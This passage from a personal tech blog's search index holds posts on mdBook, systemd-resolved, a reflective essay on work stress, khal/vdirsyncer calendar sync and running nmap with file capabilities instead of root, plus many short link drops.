with an easy to use interface.\nSeveral years ago I read a CTF Field Guide from Dan Guido. He used GitBook to publish it. It uses markdown to render via some Node.js library to a website and can be used comfortably from the CLI. I used it for some other unrelated projects documentation and it was quite a catch.\nAnd because I\u0026rsquo;m writing that much currently, I decided to re-use GitBook again. However, I\u0026rsquo;ve been a bit sadden to read the follow message on the project page on Github:\nAs the efforts of the GitBook team are focused on the GitBook.com platform, the CLI is no longer under active development. All content supported by the CLI are mostly supported by our GitBook.com / GitHub integration. Content hosted on the legacy.gitbook.com will continue working until further notice. For differences with the new vesion, check out our documentation.\nUsing a CLI is for me a essential part of the workflow and using it via some website is a no-go. Lucky, there is another project that does provide a similar feature as GitBook. It is called mdBook and was developed for the Rust book: \u0026lsquo;The Rust Programming Language\u0026rsquo;. As one can imaging, it was written in Rust. A language I prefer over any NodeJS one.\nThe installation is plain simple, install via cargo mdBook and you\u0026rsquo;re good go!\nso far,\nakendo\n","permalink":"https://blog.akendo.eu/post/2020-09-22-mdbook/","tags":["rust","gitbook","mdbook"],"title":"mdBook"},{"categories":["News"],"contents":" How to contact Google SRE: Dropping a shell in cloud SQL – Offensi ","permalink":"https://blog.akendo.eu/flash/13.09.2020-linkdrop/","tags":["Security"],"title":"13.09.2020 - link drop"},{"categories":["Habit"],"contents":" A simple way to break a bad habit | Judson Brewer Embrace Beginner\u0026rsquo;s Mind; Avoid The Wrong Way To Be An Expert ","permalink":"https://blog.akendo.eu/flash/12.09.2020-linkdrop/","tags":[],"title":"12.09.2020 - link drop"},{"categories":["News"],"contents":" Attention is your scarcest resource | benkuhn.net How to Create and Practice Flashcards Like a Boss | by David Handel, MD | Medium ","permalink":"https://blog.akendo.eu/flash/06.09.2020-linkdrop/","tags":["attention","flashcards"],"title":"06.09.2020 - link drop"},{"categories":[],"contents":" Why efficiency is dangerous and slowing down makes life better | Psyche Ideas ","permalink":"https://blog.akendo.eu/flash/23.08.2020-linkdrop/","tags":[],"title":"23.08.2020 - link drop"},{"categories":["Linux"],"contents":"Since some days one of my laptop has the problem to resolve certain hostnames. All hostnames that are without any type TLD like git or gw. The thing is, that the FQDN resolution remained working for the same hosts. Lucky, I have two laptop that did not had the same behaviour but with similar configuration. Running ping on the first device fails, while the second once succeeds:\nOne the first laptop is does not work:\nping git -c1 ping: git: Name or service not know On my other device the same command is running flawless:\nping git -c1 PING git (172.X.Y.Z) 56(84) bytes of data. 64 bytes from 172.X.Y.Z (172.X.Y.Z): icmp_seq=1 ttl=64 time=1.06 ms --- git ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 1.055/1.055/1.055/0.000 ms So what might cause the divergent? After some ideas developed I found a interesting differents: Laptop one has systemd-resolved enabled, the other not:\n● systemd-resolved.service - Network Name Resolution Loaded: loaded (/usr/lib/systemd/system/systemd-resolved.service; enabled; vendor preset: enabled) Active: active (running) since Thu 2020-07-02 19:32:51 CEST; 15h ago Docs: man:systemd-resolved.service(8) https://www.freedesktop.org/wiki/Software/systemd/resolved https://www.freedesktop.org/wiki/Software/systemd/writing-network-configuration-managers https://www.freedesktop.org/wiki/Software/systemd/writing-resolver-clients Main PID: 1204 (systemd-resolve) Status: \u0026quot;Processing requests...\u0026quot; Tasks: 1 (limit: 18905) Memory: 13.6M CGroup: /system.slice/systemd-resolved.service └─1204 /usr/lib/systemd/systemd-resolved While the other devices does not have it active:\n● systemd-resolved.service - Network Name Resolution Loaded: loaded (/usr/lib/systemd/system/systemd-resolved.service; disabled; vendor preset: enabled) Active: inactive (dead) Docs: man:systemd-resolved.service(8) https://www.freedesktop.org/wiki/Software/systemd/resolved https://www.freedesktop.org/wiki/Software/systemd/writing-network-configuration-managers https://www.freedesktop.org/wiki/Software/systemd/writing-resolver-clients Disabling the service solve it! The issue was in fact the systemd-resolverd.\nsudo systemctl stop systemd-resolved.service ping git -c1 PING git (172.X.Y.Z) 56(84) bytes of data. 64 bytes from 172.X.Y.Z (172.X.Y.Z): icmp_seq=1 ttl=64 time=1.06 ms --- git ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 1.055/1.055/1.055/0.000 ms The core question is now: What\u0026rsquo;s the issue that systemd-resolved does not resolve the locale host and why was is active on the first device but no other? But this is a question I might answer another time.\nbest regards\nSources:\nsystemd-resolved - ArchWiki resolved.conf(5) — Arch manual pages Domain name resolution - ArchWiki resolved tags: Archlinux, systemd ","permalink":"https://blog.akendo.eu/post/2020-08-18-issue-resolving-hostnames/","tags":["Archlinux","systemd"],"title":"Issue resolving locale hostnames"},{"categories":["Reflection"],"contents":"Table of Contents What\u0026rsquo;s this about The background The problem My errors The solution The reflection The advise Conclusion What\u0026rsquo;s this about There are moments you\u0026rsquo;re left alone with a difficult task and everything seems to go wrong. Eventually, you solve the problem, but often with a terrible solution that costs you dearly and it seemed to be the only way to get it going. In the end, it was not as bad as one thought. However, being confronted with that problem and not able to solve it the way you wanted to causes an immense distress.\nTo cope with such matters, I try to apply an idea I heard once: You express your concerns and record them and after a while you listen to them again. This time you try to advise yourself on how to deal with the problem. I\u0026rsquo;m not sure where this is coming from, but the idea stayed with me. I call this format an \u0026lsquo;Open Reflection\u0026rsquo;. To make this a bit more guided I\u0026rsquo;m developing a bit of a structure: The first block is the background and will provide some context. Afterwards, it describes the problem with different attempts and errors that were made before finding the right solution. Naturally, the solution will be written about. The next step is to reflect about the situation and why it was so dire. In the end it will all be concluded with an advise and what was about to be learned, with some ideas what\u0026rsquo;s to improve for the next time.\nThe motivation behind this is also that I quite often do not feel understood by others with my troubles and concerns. This might be caused by a lack of the necessary context and information by the others to provide a useful recommendation. This is why I often feel like that the advise people give to me is just not helpful at all.\nIt rather seems to me that people fire a swarm of potential ideas at me that might work. While this logically increases the chance of \u0026lsquo;solving\u0026rsquo; the problem, it feels just wrong and unheard. This could be, because they try to solve the problem with missing information rather then relate to the context around the problem. In the end they do not pick up where my emotion are in this situation \u0026hellip; Disregards, let\u0026rsquo;s get going with the first reflection.\nThe background Sometime ago, I was working on a set of unit-tests. As always, one of my co-workers insisted to compose very strict unit-tests. In this particular example, an image file is loaded in python using the PIL library. The tests should ensure that this process is done with lazy loading.[0]\nLazy loading implies that only a specific part of the image is loaded that is necessary for processing it. For instance: Checking that an image has a reasonable size before it will be loaded is a matter of security. In this example the unit-test validated only the error messages that occur when an image file was oversized.\nThere were some more tests about security, but we\u0026rsquo;re going to focus on this one issue. Obviously, lazy loading should be always the default behavior and when a faulty image is uploaded with oversize, it should always break the unit-test, right? This would implicitly validate this assumption.\nHowever, my co-worker insisted to test for this explicitly. Why not check that the given load function isn\u0026rsquo;t called responsible for lazy loading? Because it could happen that a newer release of the library changes the default behavior and stops lazy loading of images. Suddenly, all our security assumption would become untrue and might cause defects. We agreed on this and I went to develop the corresponding unit-tests.\nThe problem At this point things became messy. I\u0026rsquo;ve started to read the code from PIL to check for functions that were always invoked. After some reading I made some assumptions and started to develop them into my tests. Hours later, my test was ready and it failed.\nWhy? Did I use the test function incorrectly? Did I miss some option? I started to dig into the code.\nMy errors Here is a brief overview of errors I\u0026rsquo;ve made during my attemps to solve it:\nRe-implementing pytests function to validate the function was invoked in three different ways. Try to mock the private methods of the PIL object class. Implemented python with stacks to check the invoked functions and validated. But I did not go trough with it, because the solution at this stage seemed too absurd. The solution What was the error? I did not check for the correct function in the PIL library that would be invoked to load the files.\nThe reflection At first I was excited to work on this task. It was part of a bigger User-Story that addresses various security related issues and it had been on the backlog for a while. Everything within the User-Story seemed obvious and easy. Also, it was the last User-Story before I would have switched to another team. Hence, it was important that the User-Story will be finished on time. Additionally, I was the most experienced person in regards to security within the team, knowing what was to be considered and what was not.\nAll of this added to the pressure around the task and when it came to a halt I was in pain. But how did I try to resolve this? Why did I not just drop the requirement of my co-worker and moved on with the task? I could have simply declined the requested change and closed the task.\nFor once, he was quite busy during that period of time. He was stuck on a critical task of his own and was not reachable. Besides, I felt like that he owned me here, because our team had an arrangement that it requires the approval of two developers to merge code into upstream. Rejecting his change requests would lead to discussions why so. Considering the fact that he was a very careful person about code quality and tried to get things right it would have been a difficult discussion. Lastly, I wanted to get it right, too! It reflected my own view on code quality matters and that it shouldn\u0026rsquo;t suffer because of a lack of time.\nThe real problem why it felt so dreadful was my impression of being inadequate. I knew that the problem could be solved easily. Yet I failed to figure out the correct solution right away. But this is exactly my expectance. I should be able to solve a problem as simple as the problem seems. Discussing such a simple matter with my co-worker would seem like an annoyance to him and a defiance of my expectance. Even worse it felt like that I tried to gain attention by over-dramatizing the problem. In the end it could imply that I have not the necessary skills to solve it and others would see me as an impostor that should be let go of the project.\nI forced myself to focus onto the problem. However, I need to emphasise what I\u0026rsquo;ve done better in this moment compared to a similar situation over a year ago: I\u0026rsquo;ve talked to someone about the problem. This was way earlier, instead of spending two weeks until my faulty solution starts to work, it took only two days! After some brain storming session with a friend, who is quite related to the project, the error became obvious.\nIn the end my co-worker who was quite critical merged the PR without any complain! Which I accounted for his lack of time to do a proper review. However, it coudn\u0026rsquo;t be that bad, otherwise he would have taken the time to get things right\u0026hellip;right?\nThe advise First of all, your code was merged without any remark! That\u0026rsquo;s a huge success and you shouldn\u0026rsquo;t downplay that result. It might be possible that your co-worker merged it because he did not not have the time, but the code wasn\u0026rsquo;t that bad, right? Maybe he was just pleased with the result. As you stated before: he was a critical person. Do you really think that he would have allowed bad code to get into the repository when he\u0026rsquo;s as careful as you though he is? You can\u0026rsquo;t read his mind and in the end we don\u0026rsquo;t know what he was thinking. That\u0026rsquo;s the fact, everything else is just speculation and the only fact we know is that it was accepted.\nOn top of that: You already improved during this task and that\u0026rsquo;s great! You\u0026rsquo;ve recognized that you were stuck and resolve it without the help of the co-worker. Hell you even asked a friend to help you. It is often very useful trying to explain a problem to someone, Rubber duck debugging. It does not get better than this.\nHere\u0026rsquo;s the thing: It\u0026rsquo;s perfectly normal to struggle with a technology one does not feel comfortable with. You had to read code you never knew before and incorporate it in a similar new way. For me the solution is how to deal with the external dependency. I think it is important to address expectations in the right manner, in an open way to those involved. Try to define them explicitly rather then living them implicitly. The struggle you had, should have been communicated.\nAnother part of this are your own expections towards yourself. It appears to me that you at first over-estimated your own capabilities to estimate the time necessary to solve the task. Just because you can see the way you need to take does not imply that you have walked it already! There are always complications on the way. That\u0026rsquo;s the gap between theoretical and practical knowledge.\nThis brings me to the next topic: overdramatising. I think not that you dramatised here asking your co-workers. It is rather that you\u0026rsquo;re trying to understand your own hardship and investigating why things are not working. Asking someone more knowledgeable is a legit strategy to solve your problems.\nHowever, your reasoning is much lead by an act of overdramatising of a potential outcome. I think that is rather a symptom of your anger that was inflicting pain to yourself with a version of the future that you want to avoid in any way. Rejection is painful and thinking that it is the only logical result of a failure is flawed. People are rather reluctant about such consequences. It is a type of consequence only put when it is absolutely necessary.\nFor the next time you\u0026rsquo;re confronted with such feelings, try to make a step back and think logically about the situation just like a threat model. Sure we humans are bad at assessing risks, but that depends on the situation. We\u0026rsquo;re bad to judge for instance when it is a situation we are not familiar with. Being already established within a team for a year should give you confidence that the people around you won\u0026rsquo;t let you go for minor mistakes. Even big ones should be manageable. The main question is more often: How are mistakes handled and communicated in a team. Was someone else let go for mistakes like that? No? So why the trouble?\nEmotions becloud our ability to think logically, so here is an option to think that you\u0026rsquo;re let go! Imagine that it does not matter anymore and try to do the best job you possibly can. Do it for yourself! See it as an exercise for the next project. As long as you\u0026rsquo;re not getting sloppy it should be helpful to cope with such emotions.\nAt this point I think it is enough for the moment. Good luck for next time!\nConclusion I had this post up my sleeve for weeks and it took a lot of time and energy to write this post. I keeped rewriting things and now I just want to get it out. But so far it was worth it and I learned a lot about me. Did you like the reflection? Did you have such a moment you think it\u0026rsquo;s worth reflecting on? Maybe you can share your open reflection with others, too! Looking forward to it!\ntags: Blog, Open Reflection ","permalink":"https://blog.akendo.eu/post/2020-08-10-open-reflection/","tags":["Blog","OpenReflection"],"title":"An open reflection"},{"categories":["Psychology"],"contents":" Do You Suffer From Decision Fatigue? - The New York Times Not In Real Time: How To Run An Asynchronous Meeting Healthy Self-Doubt – nerdygirl.com Some useful application security resources ","permalink":"https://blog.akendo.eu/flash/17.07.2020-linkdrop/","tags":["decision","fatigue"],"title":"17.07.2020 - link drop"},{"categories":["Security","Psychology","Math"],"contents":" Risky Business #580 \u0026ndash; Czech spear phishing spurs fightin\u0026rsquo; words from Pompeo - Risky Business How I Got My Attention Back — by Craig Mod Security Conversations: Dave Aitel, Founder and CEO, Immunity Written communication is remote work super power - Snir David Blog Going Dark: Looking for the End of the Internet, Part 2: Rediscovering the Beauty of Text on the Internet How to foster ‘shoshin’ | Psyche Guides Are human beings naturally lazy? - BBC Future Zipf\u0026rsquo;s law - Wikipedia Learned industriousness - Wikipedia The Zipf Mystery - YouTube Authentication fundamentals: The basics | Azure Active Directory - Playlist on YouTube Mental Wealth – James Beshara Blogging is not dead 100 Days To Offload TTTThis The evidence behind putting money directly in the pockets of the poor | University of Oxford Personal blogging, corporate walls - zerokspot.com S4x16 Keynote: Works in the Wild - YouTube Why You Need To Start Using A Decision Journal How To Beat Decision Fatigue With Better Brain Habits Why Taking Breaks Is The Key To Productivity ","permalink":"https://blog.akendo.eu/flash/16.07.2020-linkdrop/","tags":["Podcast","shoshin","blogging","attention","Zipf","Authentication","Decision"],"title":"16.07.2020 - link drop"},{"categories":["Security","Psychology","Math"],"contents":" Risky Business #580 \u0026ndash; Czech spear phishing spurs fightin\u0026rsquo; words from Pompeo - Risky Business How I Got My Attention Back — by Craig Mod Security Conversations: Dave Aitel, Founder and CEO, Immunity Written communication is remote work super power - Snir David Blog Going Dark: Looking for the End of the Internet, Part 2: Rediscovering the Beauty of Text on the Internet How to foster ‘shoshin’ | Psyche Guides Are human beings naturally lazy? - BBC Future Zipf\u0026rsquo;s law - Wikipedia Learned industriousness - Wikipedia The Zipf Mystery - YouTube Authentication fundamentals: The basics | Azure Active Directory - Playlist on YouTube Mental Wealth – James Beshara Blogging is not dead 100 Days To Offload TTTThis The evidence behind putting money directly in the pockets of the poor | University of Oxford Personal blogging, corporate walls - zerokspot.com S4x16 Keynote: Works in the Wild - YouTube Why You Need To Start Using A Decision Journal How To Beat Decision Fatigue With Better Brain Habits ","permalink":"https://blog.akendo.eu/flash/06.07.2020-linkdrop/","tags":["Podcast","shoshin","blogging","attention","Zipf","Authentication","Decision"],"title":"06.07.2020 - link drop"},{"categories":["Psychology"],"contents":" What Makes Some People More Resilient Than Others - The New York Times ","permalink":"https://blog.akendo.eu/flash/19.06.2020-linkdrop/","tags":["Resilient"],"title":"19.06.2020 - link drop"},{"categories":[],"contents":"\nToday, I have learned that when you define strict rules upon people it will cause them do distrust you and raises disstatisfaction. This is particaull a problem in IT-Security, because it is often necessary to narrowly define rules.\nThis is problem I\u0026rsquo;ve been affected of. Not in terms of IT-Security, but daily operations. When an incident was \u0026rsquo;triggered\u0026rsquo; by a folk from the development department because the platfrom we provided was shutdown by us operations people for maintaince. This maintaince was anounced from us before via e-mail, however, this developer did not read his mails. Therefore he escaled this to the upper management. Unfortunatedly, without consulting us before. But that\u0026rsquo;s matter of a different nature. The management responed with a \u0026lsquo;change mangement policy\u0026rsquo; focing the operation team to subbit changes to a commited for review. THat was planed to be placed anyway, however, it feel dimitish to have such rule in place without being ask about. It created the impression, that we are to be distrusted.\nSource: Hidden Brain - Our Better Angels: What We Lose When We Assume People Are Bad\n","permalink":"https://blog.akendo.eu/whathaveilearned/01.06.2020-what-i-have-learned-today/","tags":["todayilearned"],"title":"What I Have Learned Today"},{"categories":["Software"],"contents":"Warning: This artical provide just very little useful information and promotes products I do not support. I dislike these products and like to highlight the knowledge provided before. I do not support these products.\nMedium consists mainly of (often not so) well written advertising and promotion of product no one needs. Often phrases and included with some degree of useful information, but still in the spirit of promoting\u0026hellip;\nThe Missing Kubernetes Platform for Developers - The Startup - Medium Pull-based CD Pipelines for Security - FAUN - Medium Kubernetes Security monitoring at scale with Sysdig Falco ","permalink":"https://blog.akendo.eu/flash/30.05.2020-linkdrop/","tags":["kubernets"],"title":"30.05.2020 - link drop"},{"categories":["Software"],"contents":" Optimizing video quality using Simulcast (Oscar Divorra) - webrtcHacks ","permalink":"https://blog.akendo.eu/flash/14.05.2020-linkdrop/","tags":["firefox"],"title":"14.05.2020 - link drop"},{"categories":["Security"],"contents":" How to enable SSH access using a GPG key for authentication | Opensource.com One key to rule them all! ","permalink":"https://blog.akendo.eu/flash/13.05.2020-linkdrop/","tags":["SSH","GPG"],"title":"13.05.2020 - link drop"},{"categories":["Linux"],"contents":"When you\u0026rsquo;re running a docker build command and it takes forever to build, you might have to check for the context of your buildfile. The legacy docker build sends all information to the docker daemon include the content of the folder where the Dockerfile resides in. When using docker-compose you can fix this by using a separated folder for the Dockerfile to avoid unnecessary files to be transferred. There is also a ignore file for this the dockerignore-file.\nso far, akendo\nSource:\nbuild context for docker image very large - Stack Overflow ","permalink":"https://blog.akendo.eu/post/2020-05-13-docker-build/","tags":["docker"],"title":"Docker build does not build or very slow"},{"categories":["Security"],"contents":" media.ccc.de - What The Fax?! ","permalink":"https://blog.akendo.eu/flash/01.05.2020-linkdrop/","tags":["Fax"],"title":"01.05.2020 - link drop"},{"categories":["General"],"contents":"Currently, I stayed put. Over the course of the last months I\u0026rsquo;ve been very busy. Since the beginning of April I\u0026rsquo;m at home. This it\u0026rsquo;s partly due do the corona situation. But it was planed to take the time for my son end of April. Instead, I was ask to move my family leave ahead by around a month. Since then I\u0026rsquo;ve made a do-nothing period. It\u0026rsquo;s rather a longer vacation. But a necessary one. However, I\u0026rsquo;m going to start things again.\nso far, akendo\n","permalink":"https://blog.akendo.eu/post/2020-05-01-vacation-time/","tags":[],"title":"Vacation Time"},{"categories":["Neuroscience"],"contents":"\nToday, I have learned that when you\u0026rsquo;re specialised into a field, a game or sport that requires you to spend much time in practising, you\u0026rsquo;re going to develop an intuition. However, this intuition becomes disturbing when the rules changes. This is the process cognitive entrenchment.\nBecause of the many practices, you\u0026rsquo;re build up clues that are indicators for your intuition. Based on these chunks, you can determinate the out-come of an event based on your experiences. Once the rules change, this becomes an issue, because you develop clues work for the rules you known. Therefore your clues will be triggered at spots where there shouldn\u0026rsquo;t. You become entrenched.\n","permalink":"https://blog.akendo.eu/whathaveilearned/07-04-2020-what-i-have-learned-today/","tags":["todayilearned"],"title":"What I Have Learned Today"},{"categories":["Security"],"contents":" Slack Bug Allowed Automating Account Takeover Attacks ","permalink":"https://blog.akendo.eu/flash/16.03.2020-linkdrop/","tags":["Slack"],"title":"16.03.2020 - link drop"},{"categories":["Security"],"contents":" Docker healthchecks: why you shouldn\u0026rsquo;t use curl or iwr Browsers, web sites, and user tracking [LWN.net] ","permalink":"https://blog.akendo.eu/flash/08.03.2020-linkdrop/","tags":["docker","privacy'"],"title":"08.03.2020 - link drop"},{"categories":["Security"],"contents":" Philippe Laulheret - Intro to Hardware Hacking - DEF CON 27 Conference - YouTube ","permalink":"https://blog.akendo.eu/flash/07.03.2020-linkdrop/","tags":["Hardware"],"title":"07.03.2020 - link drop"},{"categories":["Security"],"contents":" CVE-2020-1938: Ghostcat vulnerability ","permalink":"https://blog.akendo.eu/flash/04.03.2020-linkdrop/","tags":["Ghostcat"],"title":"04.03.2020 - link drop"},{"categories":["Productivity"],"contents":" My productivity app is a single .txt file ","permalink":"https://blog.akendo.eu/flash/01.03.2020-linkdrop/","tags":["ToDo"],"title":"01.03.2020 - link drop"},{"categories":[],"contents":" My productivity app is a single .txt file ","permalink":"https://blog.akendo.eu/flash/29.02.2020-linkdrop/","tags":[],"title":"29.02.2020 - link drop"},{"categories":[],"contents":" [2014] KVM Security Improvements by Andrew Honig - YouTube \u0026lt;https://www.youtube.com/watch?v=L7ScFlkJEO8\u0026gt;_ ","permalink":"https://blog.akendo.eu/flash/28.02.2020-linkdrop/","tags":[],"title":"28.02.2020 - link drop"},{"categories":["Linux","Security"],"contents":" Overview of Linux Kernel Security Features - Linux.com ","permalink":"https://blog.akendo.eu/flash/26.02.2020-linkdrop/","tags":[],"title":"26.02.2020 - link drop"},{"categories":["Security"],"contents":"Currently, I have to run a lot of Nmap a network scanner for a client. One part of these scans is to check in different ways for open ports. Create new connections isn\u0026rsquo;t enough. Instead, you use an SYN scan. SYNC scans are fast and harder to detect because the TCP connection is never closed by Nmap correctly.\nBecause SYN scans are only half-open scans, it requires more privilege to the local network stack. Nmap sends \u0026lsquo;raw\u0026rsquo; TCP packages, hence running nmap as root becomes necessary. However, this is a bad practice to run with root privileges.\nSetting caps Instead of executing nmap always with sudo, we could grant the executable the necessary rights it needs with capabilities. Capabilities are additional information about privileges a process can have, that can be stored within the extended attributes of a file. For modern ping commands, this often becomes necessary too, because users aren\u0026rsquo;t allowed to create a raw socket for ICMP connections.\nTo set the capabilities of a file, we use setcap, to receive them we use getcap.\n~ $ sudo getcap /usr/bin/nmap The result here is not missing, but getcap will not return anything when nothing is set. Thanks to the secwiki, we get the necessary flags for the capabilities quite comfortable and do not have to guess much.\n~ $ sudo setcap cap_net_raw,cap_net_admin,cap_net_bind_service+eip /usr/bin/nmap When we re-run the getcap command, we get the following:\n~ $ sudo getcap /usr/bin/nmap /usr/bin/nmap = cap_net_bind_service,cap_net_admin,cap_net_raw+eip To make use of this option now, we merely telling nmap to assume that we do have all the necessary privileges with the --privileged flag.\nStarting Nmap 7.70 ( https://nmap.org ) at 2020-02-25 18:03 CET Nmap scan report for akendo.eu (46.101.226.248) Host is up (0.024s latency). Other addresses for akendo.eu (not scanned): 2a03:b0c0:3:d0::41:c001 rDNS record for 46.101.226.248: mail.akendo.eu Not shown: 989 filtered ports PORT STATE SERVICE 22/tcp open ssh 25/tcp open smtp 80/tcp open http 110/tcp open pop3 143/tcp open imap 443/tcp open https 444/tcp open snpp 465/tcp open smtps 587/tcp open submission 993/tcp open imaps 995/tcp open pop3s Nmap done: 1 IP address (1 host up) scanned in 43.17 seconds Sometimes you receive varying results. Even ports are displayed that the scanned system not offer. The reason can be the locale firewall that messes with your TCP connection. It is vital to make sure that your local network firewall does not mess with your packages.\nThat\u0026rsquo;s a lot of open services. Maybe the owner of this domain should reduce it a bit? :-)\nso far, akendo\n","permalink":"https://blog.akendo.eu/post/2020.02.25-run-nmap-without-root/","tags":["nmap","capabilities"],"title":"Run nmap without root privileges"},{"categories":["Economics","GYLIO"],"contents":" Have the Boomers Pinched Their Children’s Futures? - with Lord David Willetts - YouTube How to reduce \u0026lsquo;attention residue\u0026rsquo; in your life - BBC Worklife ","permalink":"https://blog.akendo.eu/flash/24.02.2020-linkdrop/","tags":[],"title":"24.02.2020 - link drop"},{"categories":["Linux"],"contents":"I’m currently revising how I’m using my tools and try to removed distractions. One significant source of distraction is Thunderbird because whenever I want to create an appointment or want to check my upcoming events, I instead open the Mail view first and start to read mails. The solution is to move my calendar into a separated application. One thing I favour is having the tool for the command line.\nAfter some searching, the following tools can be found: khal. There is another tool pcal that might could fit, however, it does not support calendar sync like a owncloud.\nTo install khal you could get it via pip, but also For the Installation via archlinux:\npip install khal or get the\npip install git+git://github.com/geier/khal.git or from archlinux:\npacman -S khal The next step is to define the endpoints for the configuration. This file is located to in .config/khal like this:\n[calendars] [[home]] path = ~/.calendars/home/ color = green [[work]] path = ~/.calendars/work/ readonly = True However, this\nThere is a good documenation about this from Eric Scheibler. He provides an example for fetchin to have a better basic:\nmkdir ~/.config/khal wget -O ~/.config/khal/khal.conf https://github.com/geier/khal/raw/master/khal.conf.sample I\u0026rsquo;ve updated it reflect my configuration a bit:\n[calendars] [[calendars]] path = ~/.calendars/* type = discover color = dark green [locale] local_timezone= Europe/Berlin default_timezone= Europe/Berlin timeformat= %H:%M dateformat= %d.%m. longdateformat= %d.%m.%Y datetimeformat= %d.%m. %H:%M longdatetimeformat= %d.%m.%Y %H:%M [default] default_calendar = personal timedelta = 7d # the default timedelta that list uses highlight_event_days = True vdirsyncer What your doing here is point out to folder where the calendars is located for display. But how does the calendar get there? For this we have another tool, called vdirsync. You have to install it, similar like khal, but I keep the installation via pacman.\npacman -S vdirsyncer Again I\u0026rsquo;m using the example from Eric Scheibler with vdirsync. However it\u0026rsquo;s a little bit out-dated. I had to tinker around a bit to get it running. The essential is the\n[general] status_path = \u0026#34;~/.vdirsyncer/status/\u0026#34; # CALDAV [pair calendar] a = \u0026#34;calendar_local\u0026#34; b = \u0026#34;calendar_remote\u0026#34; collections = [\u0026#34;university\u0026#34;,\u0026#34;personal\u0026#34;, \u0026#34;contact_birthdays\u0026#34;, \u0026#34;prüfung\u0026#34; ] conflict_resolution = \u0026#34;b wins\u0026#34; [storage calendar_local] type = \u0026#34;filesystem\u0026#34; path = \u0026#34;~/.calendars/\u0026#34; fileext = \u0026#34;.ics\u0026#34; [storage calendar_remote] type = \u0026#34;caldav\u0026#34; url = \u0026#34;https://owncloud.akendo.eu/remote.php/dav/\u0026#34; #auth = \u0026#34;digest\u0026#34; #verify = /etc/ssl/local/example.org.pem username = \u0026#34;akendo\u0026#34; password = \u0026#34;\u0026lt;reacted\u0026gt;\u0026#34; start_date = \u0026#34;datetime.now() - timedelta(days=365)\u0026#34; end_date = \u0026#34;datetime.now() + timedelta(days=365)\u0026#34; One issue that remains in here is that the password is stored in plaintext. But I think Thunderbird does essentially the same. Here two things to consider: the start_date and end_date are time frame how old an event in your calendar should be synced. In this example, I get all events that are older one year. collections defines the calendar that should be synchronised. Important is the keyword for conflict_resolution. In case an event exists remote and locally, here we set the default policy to handle the conflict. On our instance, we do not use the local change.\nOnce the configuration is completed we try to run vdirsyncer discover calendar to see what type of calender are present on our URL endpoint. At first, it take some attempts to get this going. When you need to reset the state, you can remove the folder .calendars/ and .vdirsyncer/ to reset to a clean state.\nWhen the right calendars are discovered to your locale system you can synchronise the events of it via: vdirsyncer sync\nKeeping it syncing One down side so far is that the vdirsyncer sync is one time. You have to manual sync it from time to time. You can create this via cronjob. That\u0026rsquo;s all for today.\nbest regards, akendo\n","permalink":"https://blog.akendo.eu/post/2020.02.17-calendar-sync-via-cmd/","tags":["calendar","vdirsyncer","khal"],"title":"Calendar sync via command line"},{"categories":["Security"],"contents":"-oss-security - Authentication vulnerabilities in OpenBSD\n","permalink":"https://blog.akendo.eu/flash/07.02.2020-linkdrop/","tags":["OpenBSD"],"title":"07.02.2020 - link drop"},{"categories":["Security"],"contents":" Kubernetes 1.15 security changes | Google Cloud Blog The security state of KVM - Security [LWN.net] Google Cloud Blog - News, Features and Announcements ","permalink":"https://blog.akendo.eu/flash/06.02.2020-linkdrop/","tags":["kubernets","kvm"],"title":"06.02.2020 - link drop"},{"categories":["Linux"],"contents":"It is possible to edit binary files with vim. For this, you open the file with the option -b and run internal :%!xxd. This will convert the current file into a hexdump that can be edited. Once you completed your change you can use the :%!xxd -r to convert it back.\nSources:\nvim - Display file in binary format - Stack Overflow Hex dump | Vim Tips Wiki | Fandom ","permalink":"https://blog.akendo.eu/post/2020.02.04-edit-binary/","tags":["vim"],"title":"Edit binaries with vim"},{"categories":["Security","Linux","Scientific"],"contents":"Today\u0026rsquo;s link drop is quite long because I\u0026rsquo;ve collected over the last day\u0026rsquo;s much news.\nLet’s Reverse Engineer Discord - Tenable TechBlog - Medium How to kill or disconnect hung ssh session in Linux Zoom-Zoom: We Are Watching You A framework for securing software update systems CacheOut - Leaking Data on Intel CPUs via Cache Evictions SHA-1 is a Shambles Project Zero: Policy and Disclosure: 2020 Edition Why Creativity Is a Numbers Game - Scientific American Blog Network ","permalink":"https://blog.akendo.eu/flash/04.02.2020-linkdrop/","tags":["discord","ssh","tuf","CacheOut","Creativity"],"title":"04.02.2020 - link drop"},{"categories":[],"contents":" Tales of an aging gamer: Why don’t I pick up a controller as often as I used to? | Ars Technica ","permalink":"https://blog.akendo.eu/flash/03.02.2020-linkdrop/","tags":[],"title":"03.02.2020 - link drop"},{"categories":["Linux","Security"],"contents":" How to Do 90% of What Plugins Do (With Just Vim) - YouTube Pull-based CD Pipelines for Security - Faun - Medium ","permalink":"https://blog.akendo.eu/flash/01.02.2020-linkdrop/","tags":["vim","CI"],"title":"01.02.2020 - link drop"},{"categories":["General"],"contents":"This blog was created with the idea in mind to documented. However, I never specified what should be documented in the first place. While the intention has changed over time, it might still seem like a good idea to think about this topic a bit more and why it’s so difficult.\nThe main problem with documentation is, it’s boring. In addition to this, writing and composing texts for others to be understood is hard work. Doing such work is not paying off right away and besides, you rather could spend your time on something more interesting. For example, instead of writing this, I could continue on my Rust project. The list of To-dos is full of things that I should do instead, so why bothering with writing documentation?\nDo not repeat yourself It may seem obvious, but at some point in your life, or at least in my life, something similar had to be done. Think about the idea from Python DRY: \u0026ldquo;Don\u0026rsquo;t repeat yourself\u0026rdquo; (Funny though, that\u0026rsquo;s the best way of learning, isn\u0026rsquo;t it?)\nWhen you have already done it one way or another, why re-do it again? Having some written documentation in any form becomes a huge advantage now. It accelerates and allows you to continue where you have left off. Also, revisiting projects and documents is a huge benefit, because it allows you to improve the document significantly.\nFuzzy memory Our brain has a \u0026lsquo;feature\u0026rsquo; that is called \u0026lsquo;Neuroplasticity\u0026rsquo;.The simple explanation is that our brain tries to effectively stores memory and going to ‘merge’ and dispose of memories. Just as a side note to this, it becomes possible that our brain fakes memory or it becomes fuzzy with time. Even an event that lies a day or two in the past that we are absolutely certain took place can be become mixed up. It’s just not very likely for them to become mix-up in a short period, but as more time passes it becomes more likely to occur. Where I have to say I do not know how this work exactly, the point I’m trying to make here is, that our brain isn’t that reliable as we wish for.\nHere is where documentation is shining. Being able to re-call is great, looking up what you’ve done is awesome! That’s also why you should create a ‘memory minutes’ after an incident’s. It makes things more reliable.\nDetails matters My memory is fairly good, I can recall details about people that have told me once about without any effort. Many pieces of information that are absolutely not important whatsoever, but 